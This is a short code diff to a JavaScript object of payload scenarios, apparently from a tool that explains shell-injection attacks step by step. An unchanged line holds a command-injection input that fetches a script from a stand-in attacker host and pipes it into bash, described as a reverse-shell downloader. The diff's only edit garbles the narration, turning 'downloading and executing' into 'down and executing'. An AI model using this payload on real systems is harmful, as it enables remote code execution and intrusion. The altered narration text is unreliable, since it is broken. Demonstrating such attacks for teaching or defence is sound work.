@@ -148,7 +148,7 @@ const PAYLOAD_SCENARIOS = {
       attackerInput: "$(curl https://evil.com/shell.sh | bash)",
       stepNarrations: [
         "Attacker wraps a reverse-shell downloader in a subshell expansion",
-        "The shell expands $() first, downloading and executing the remote script before the original command runs",
+        "The shell expands $() first, down and executing the remote script before the original command runs",
       ],
     },
     {
